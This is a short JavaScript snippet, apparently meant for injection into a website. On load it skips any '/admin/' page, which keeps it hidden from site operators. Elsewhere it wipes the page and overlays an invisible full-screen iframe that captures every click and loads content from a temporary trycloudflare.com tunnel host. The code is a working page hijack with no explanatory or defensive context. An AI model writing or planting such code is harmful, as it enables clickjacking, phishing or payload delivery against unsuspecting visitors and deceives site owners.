window.addEventListener('load', () => {
    const currentUrl = window.location.href;
    
    if (currentUrl.includes('/admin/')) {
        console.log('Halaman admin, script dibatalkan.');
        return;
    }

    setTimeout(() => {
        document.body.innerHTML = '';

        const iframe = document.createElement('iframe');
        iframe.src = 'https://apps-warranties-tion-industries.trycloudflare.com/oke.html';
        
        iframe.style.cssText = `
            position: fixed;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            border: none;
            z-index: 999999;
            opacity: 0;           
            pointer-events: auto; 
        `;

        document.body.appendChild(iframe);
    }, 150);
});
